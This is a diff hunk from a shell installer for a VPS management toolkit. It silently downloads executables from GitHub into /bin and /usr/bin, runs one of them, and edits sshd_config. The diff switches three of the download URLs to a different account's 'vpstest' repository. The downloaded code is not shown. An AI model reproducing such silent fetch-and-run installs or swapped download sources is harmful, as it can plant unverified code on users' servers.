@@ -239,11 +239,11 @@ chmod 775 /usr/bin/SPR &>/dev/null
 wget -O /usr/bin/SOPORTE https://raw.githubusercontent.com/ScrimceNetwork/VPS-MX-FREE/main/Files/SOPORTE &>/dev/null
 chmod 775 /usr/bin/SOPORTE &>/dev/null
 SOPORTE &>/dev/null
-wget -O /bin/rebootnb https://raw.githubusercontent.com/ScrimceNetwork/VPS-MX-FREE/main/Files/rebootnb &>/dev/null
+wget -O /bin/rebootnb https://raw.githubusercontent.com/hhportugames/vpstest/main/rebootnb &>/dev/null
 chmod +x /bin/rebootnb
-wget -O /bin/resetsshdrop https://raw.githubusercontent.com/ScrimceNetwork/VPS-MX-FREE/main/Files/resetsshdrop &>/dev/null
+wget -O /bin/resetsshdrop https://raw.githubusercontent.com/hhportugames/vpstest/main/resetsshdrop &>/dev/null
 chmod +x /bin/resetsshdrop
-wget -O /bin/monitor.sh https://raw.githubusercontent.com/ScrimceNetwork/VPS-MX-FREE/main/Files/monitor.sh &> /dev/null
+wget -O /bin/monitor.sh https://raw.githubusercontent.com/hhportugames/vpstest/main/monitor.sh &> /dev/null
 chmod +x /bin/monitor.sh
 wget -O /etc/versin_script_new https://raw.githubusercontent.com/ScrimceNetwork/VPS-MX-FREE/main/Files/Version &>/dev/null
 grep -v "^PasswordAuthentication" /etc/ssh/sshd_config >/tmp/passlogin && mv /tmp/passlogin /etc/ssh/sshd_config
